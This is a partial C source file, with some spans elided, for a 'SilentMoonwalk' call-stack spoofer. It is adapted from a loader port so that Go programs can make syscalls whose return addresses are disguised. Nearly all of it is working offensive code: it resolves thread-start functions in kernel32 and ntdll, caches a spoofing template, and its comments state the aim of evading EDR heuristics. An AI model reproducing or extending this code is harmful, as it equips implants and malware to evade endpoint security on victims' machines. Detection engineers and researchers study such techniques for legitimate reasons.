/*
 * SilentMoonwalk call stack spoofer (desync mode) — cgo/Go-syscall variant.
 *
 * Adapted from the Crystal-Kit loader port of SilentMoonwalk.cpp:
 *   - plain GetModuleHandleA/GetProcAddress imports (cgo performs a real
 *     link; the loader's DECLSPEC_IMPORT KERNEL32$... slots are only
 *     resolved by the PICO tool, not by any import library)
 *   - the discovery half of spoof_call (exception-directory walks) is cached
 *     once per process: doing it on every syscall is far too slow and the
 *     repeated directory scans are themselves an EDR heuristic
 *   - the per-call half fills the dynamic fields and runs the desync asm
 */
...
static int smw_build_template(PSPOOFER config) {
  HMODULE kernelBase;
  HMODULE kernel32;
  HMODULE ntdll;
  DWORD rtSize = 0;
  ...
  custom_memset(config, 0, sizeof(SPOOFER));
   ...
   * frame sizes once so the assembly can synthesise the thread-root frames
   * above the patched return address. */
  kernel32 = GetModuleHandleA("kernel32.dll");
  if (kernel32) {
    config->BaseThreadInitThunkAddress =
        (PVOID)GetProcAddress(kernel32, "BaseThreadInitThunk");
  }

  ntdll = GetModuleHandleA("ntdll.dll");
  if (ntdll) {
    config->RtlUserThreadStartAddress =
        (PVOID)GetProcAddress(ntdll, "RtlUserThreadStart");
  }
...
/* Process-wide cached template: the static discovery half of spoof_call. */
static SPOOFER g_smw_template;
static volatile LONG g_smw_ready = 0;

/* smw_ensure_init builds the template once. Safe for concurrent callers:
 * first calls race benignly and produce the same deterministic config; the
 * InterlockedCompareExchange winner's writes are visible to all readers on
 * x64 (TSO + full barrier). */
int smw_ensure_init(void) {
  ...
  if (!smw_build_template(&tmp)) {
    return 0;
  }
  if (InterlockedCompareExchange(&g_smw_ready, 1, 0) == 0) {
    g_smw_template = tmp;
  }
  return 1;
}
...
ULONG_PTR spoof_call(FUNCTION_CALL *call) {
  ...
  config = g_smw_template;

  config.SpoofFunctionPointer = call->ptr;
  config.SSN = (UINT64)call->ssn;
